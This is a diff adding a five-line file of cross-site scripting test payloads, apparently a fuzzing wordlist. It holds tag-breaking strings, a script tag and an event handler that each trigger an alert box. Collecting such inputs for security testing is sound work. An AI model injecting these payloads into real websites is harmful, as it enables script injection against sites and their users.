@@ -1,0 +1,5 @@
+"><input>
+"></input><input>
+"; alert('XSS')//
+"><script>alert('XSS')</script>
+'onmouseover=alert(9) 
